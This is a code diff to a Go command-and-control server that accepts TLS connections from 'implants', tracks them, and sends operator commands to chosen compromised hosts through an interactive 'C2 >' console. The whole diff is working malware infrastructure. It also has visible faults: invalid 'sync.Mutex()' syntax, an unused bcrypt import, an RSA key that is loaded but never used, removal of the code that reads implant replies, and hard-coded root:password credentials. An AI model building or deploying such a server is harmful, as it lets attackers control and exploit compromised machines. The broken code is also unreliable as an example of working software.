@@ -2,8 +2,14 @@ package main
 
 import (
 	"bufio"
+	"crypto/rsa"
+	"crypto/tls"
 	"database/sql"
+	"encoding/pem"
 	"fmt"
+	"github.com/peterh/liner"
+	"golang.org/x/crypto/bcrypt"
+	"io/ioutil"
 	"net"
 	"os"
 	"strings"
@@ -15,37 +21,50 @@ import (
 var implants = make(map[string]net.Conn)
 var mutex = sync.Mutex()
 var db *sql.DB
+var privateKey *rsa.PrivateKey
 
 func main() {
+	loadPrivateKey()
+
 	var err error
-	db, err = sql.Open("mysql", "root:password@tcp(127.0.0.1:3306)/c2db")
+	db, err = sql.Open("mysql", "root:password@tcp(127.0.0.1:3306)/c2_operators")
 	if err != nil {
 		panic(err)
 	}
 	defer db.Close()
 
-	ln, err := net.Listen("tcp", ":5000")
+	cert, err := tls.LoadX509KeyPair("certs/server.crt", "certs/server.key")
+	if err != nil {
+		panic(err)
+	}
+
+	config := &tls.Config{Certificates: []tls.Certificate{cert}}
+	ln, err := tls.Listen("tcp", ":5000", config)
 	if err != nil {
 		panic(err)
 	}
 	defer ln.Close()
 
-	fmt.Println("[+] C2 Server running on port 5000...")
+	fmt.Println("[+] C2 Server (TLS) running on port 5000...")
 	go acceptConnections(ln)
 
-	for {
-		fmt.Print("C2> ")
-		reader := bufio.NewReader(os.Stdin)
-		command, _ := reader.ReadString('\n')
-		command = strings.TrimSpace(command)
+	startCLI()
+}
 
-		if command == "list" {
-			listImplants()
-		} else {
-			fmt.Print("Enter implant IP: ")
-			ip, _ := reader.ReadString('\n')
-			sendCommand(strings.TrimSpace(ip), command)
-		}
+func loadPrivateKey() {
+	keyData, err := ioutil.ReadFile("certs/rsa_private.pem")
+	if err != nil {
+		panic(err)
+	}
+
+	block, _ := pem.Decode(keyData)
+	if block == nil {
+		panic("[-] Failed to decode RSA private key")
+	}
+
+	privateKey, err = rsa.ParsePKCS1PrivateKey(block.Bytes)
+	if err != nil {
+		panic(err)
 	}
 }
 
@@ -56,51 +75,68 @@ func acceptConnections(ln net.Listener) {
 			continue
 		}
 		addr := conn.RemoteAddr().String()
+		fmt.Println("[+] Implant connected:", addr)
+
 		mutex.Lock()
 		implants[addr] = conn
 		mutex.Unlock()
-		fmt.Println("[+] Implant connected from", addr)
-
-		_, _ = db.Exec("INSERT INTO implants (ip) VALUES (?) ON DUPLICATE KEY UPDATE last_seen = CURRENT_TIMESTAMP", addr)
-
-		go handleConnection(conn, addr)
 	}
 }
 
-func handleConnection(conn net.Conn, id string) {
-	defer func() {
-		mutex.Lock()
-		delete(implants, id)
-		mutex.Unlock()
-		conn.Close()
-	}()
+func startCLI() {
+	line := liner.NewLiner()
+	defer line.Close()
 
-	buffer := make([]byte, 4096)
-	for {
-		n, err := conn.Read(buffer)
-		if err != nil {
-			fmt.Println("[-] Implant disconnected:", id)
-			return
+	line.SetCtrlCAborts(true)
+	line.SetCompleter(func(line string) []string {
+		commands := []string{"list", "send", "exit"}
+		var suggestions []string
+		for _, cmd := range commands {
+			if strings.HasPrefix(cmd, line) {
+				suggestions = append(suggestions, cmd)
+			}
 		}
-		fmt.Printf("[+] Response from %s: %s\n", id, string(buffer[:n]))
+		return suggestions
+	})
+
+	for {
+		input, err := line.Prompt("C2 > ")
+		if err != nil {
+			break
+		}
+
+		line.AppendHistory(input)
+		input = strings.TrimSpace(input)
+
+		switch {
+		case input == "list":
+			listImplants()
+		case strings.HasPrefix(input, "send"):
+			args := strings.SplitN(input, " ", 3)
+			if len(args) < 3 {
+				fmt.Println("Usage: send <IP> <command>")
+				continue
+			}
+			sendCommand(args[1], args[2])
+		case input == "exit":
+			fmt.Println("[+] Exiting C2 Server...")
+			return
+		default:
+			fmt.Println("[-] Unknown command")
+		}
 	}
 }
 
 func listImplants() {
-	rows, err := db.Query("SELECT id, ip, last_seen FROM implants")
-	if err != nil {
-		fmt.Println("[-] Database error")
+	mutex.Lock()
+	defer mutex.Unlock()
+	if len(implants) == 0 {
+		fmt.Println("[-] No active implants")
 		return
 	}
-	defer rows.Close()
-
-	fmt.Println("[+] Active implants:")
-	for rows.Next() {
-		var id int
-		var ip string
-		var lastSeen string
-		rows.Scan(&id, &ip, &lastSeen)
-		fmt.Printf("   [%d] %s - Last Seen: %s\n", id, ip, lastSeen)
+	fmt.Println("[+] Active Implants:")
+	for ip := range implants {
+		fmt.Println("   -", ip)
 	}
 }
 
@@ -110,12 +146,15 @@ func sendCommand(ip, command string) {
 	mutex.Unlock()
 
 	if !exists {
-		fmt.Println("[-] Invalid implant IP")
+		fmt.Println("[-] Implant not found")
 		return
 	}
 
-	_, err := conn.Write([]byte(command))
+	_, err := conn.Write([]byte(command + "\n"))
 	if err != nil {
 		fmt.Println("[-] Failed to send command")
+		mutex.Lock()
+		delete(implants, ip)
+		mutex.Unlock()
 	}
 }
